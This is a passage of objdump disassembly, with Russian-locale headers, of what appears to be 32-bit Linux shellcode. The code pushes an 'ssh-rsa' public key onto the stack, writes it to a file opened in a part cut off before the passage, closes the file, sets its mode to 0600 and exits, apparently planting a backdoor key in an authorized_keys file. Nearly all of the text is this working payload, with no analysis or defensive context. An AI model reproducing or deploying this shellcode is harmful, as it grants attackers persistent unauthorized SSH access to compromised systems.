 804a06e:	58                   	pop    %eax
 804a06f:	cd 80                	int    $0x80
 804a071:	93                   	xchg   %eax,%ebx
 804a072:	89 e6                	mov    %esp,%esi
 804a074:	31 d2                	xor    %edx,%edx
 804a076:	52                   	push   %edx
 804a077:	6a 0a                	push   $0xa
 804a079:	68 20 78 78 78       	push   $0x78787820
 804a07e:	68 31 35 54 4a       	push   $0x4a543531
 804a083:	68 56 39 48 57       	push   $0x57483956
 804a088:	68 6d 75 2b 38       	push   $0x382b756d
 804a08d:	68 31 35 64 31       	push   $0x31643531
 804a092:	68 64 2f 71 69       	push   $0x69712f64
 804a097:	68 52 4b 61 79       	push   $0x79614b52
 804a09c:	68 70 70 79 6e       	push   $0x6e797070
 804a0a1:	68 35 46 31 6d       	push   $0x6d314635
 804a0a6:	68 55 64 5a 35       	push   $0x355a6455
 804a0ab:	68 4d 2b 4c 63       	push   $0x634c2b4d
 804a0b0:	68 38 59 41 6d       	push   $0x6d415938
 804a0b5:	68 4d 42 50 79       	push   $0x7950424d
 804a0ba:	68 4c 44 4d 58       	push   $0x584d444c
 804a0bf:	68 41 34 31 38       	push   $0x38313441
 804a0c4:	68 65 33 76 4d       	push   $0x4d763365
 804a0c9:	68 48 6f 78 77       	push   $0x77786f48
 804a0ce:	68 34 6d 46 36       	push   $0x36466d34
 804a0d3:	68 48 39 6f 39       	push   $0x396f3948
 804a0d8:	68 56 59 48 6a       	push   $0x6a485956
 804a0dd:	68 4b 41 74 6d       	push   $0x6d74414b
 804a0e2:	68 70 7a 64 71       	push   $0x71647a70
 804a0e7:	68 50 2b 76 4d       	push   $0x4d762b50
 804a0ec:	68 6c 47 51 43       	push   $0x4351476c
 804a0f1:	68 50 68 4f 32       	push   $0x324f6850
 804a0f6:	68 4d 37 48 35       	push   $0x3548374d
 804a0fb:	68 76 6b 6c 47       	push   $0x476c6b76
 804a100:	68 37 74 4f 35       	push   $0x354f7437
 804a105:	68 54 63 6e 77       	push   $0x776e6354
 804a10a:	68 36 63 77 65       	push   $0x65776336
 804a10f:	68 6d 62 64 71       	push   $0x7164626d
 804a114:	68 4e 32 75 70       	push   $0x7075324e
 804a119:	68 74 73 6a 58       	push   $0x586a7374
 804a11e:	68 41 47 45 41       	push   $0x41454741
 804a123:	68 49 77 41 41       	push   $0x41417749
 804a128:	68 41 41 41 42       	push   $0x42414141
 804a12d:	68 63 32 45 41       	push   $0x41453263
 804a132:	68 61 43 31 79       	push   $0x79314361
 804a137:	68 42 33 4e 7a       	push   $0x7a4e3342
 804a13c:	68 41 41 41 41       	push   $0x41414141
 804a141:	68 72 73 61 20       	push   $0x20617372
 804a146:	68 73 73 68 2d       	push   $0x2d687373
 804a14b:	89 e1                	mov    %esp,%ecx
 804a14d:	b2 a9                	mov    $0xa9,%dl
 804a14f:	6a 04                	push   $0x4
 804a151:	58                   	pop    %eax
 804a152:	cd 80                	int    $0x80
 804a154:	34 af                	xor    $0xaf,%al
 804a156:	cd 80                	int    $0x80
 804a158:	04 0f                	add    $0xf,%al
 804a15a:	89 f3                	mov    %esi,%ebx
 804a15c:	66 b9 80 01          	mov    $0x180,%cx
 804a160:	cd 80                	int    $0x80
 804a162:	6a 01                	push   $0x1
 804a164:	58                   	pop    %eax
 804a165:	cd 80                	int    $0x80
	...

Дизассемблирование раздела .bss:

0804a168 <__bss_start>:
 804a168:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .comment:

00000000 <.comment>:
   0:	47                   	inc    %edi
   1:	43                   	inc    %ebx
   2:	43                   	inc    %ebx
   3:	3a 20                	cmp    (%eax),%ah
   5:	28 55 62             	sub    %dl,0x62(%ebp)
   8:	75 6e                	jne    78 <_init-0x804825c>
   a:	74 75                	je     81 <_init-0x8048253>
   c:	20 34 2e             	and    %dh,(%esi,%ebp,1)
   f:	38 2e                	cmp    %ch,(%esi)
  11:	34 2d                	xor    $0x2d,%al
  13:	32 75 62             	xor    0x62(%ebp),%dh
  16:	75 6e                	jne    86 <_init-0x804824e>
  18:	74 75                	je     8f <_init-0x8048245>
  1a:	31 7e 31             	xor    %edi,0x31(%esi)
  1d:	34 2e                	xor    $0x2e,%al
  1f:	30 34 29             	xor    %dh,(%ecx,%ebp,1)
  22:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  25:	38 2e                	cmp    %ch,(%esi)
  27:	34 00                	xor    $0x0,%al
  29:	47                   	inc    %edi
  2a:	43                   	inc    %ebx
  2b:	43                   	inc    %ebx
  2c:	3a 20                	cmp    (%eax),%ah
  2e:	28 55 62             	sub    %dl,0x62(%ebp)
  31:	75 6e                	jne    a1 <_init-0x8048233>
  33:	74 75                	je     aa <_init-0x804822a>
  35:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  38:	38 2e                	cmp    %ch,(%esi)
  3a:	32 2d 31 39 75 62    	xor    0x62753931,%ch
  40:	75 6e                	jne    b0 <_init-0x8048224>
  42:	74 75                	je     b9 <_init-0x804821b>
  44:	31 29                	xor    %ebp,(%ecx)
  46:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  49:	38 2e                	cmp    %ch,(%esi)
  4b:	32 00                	xor    (%eax),%al
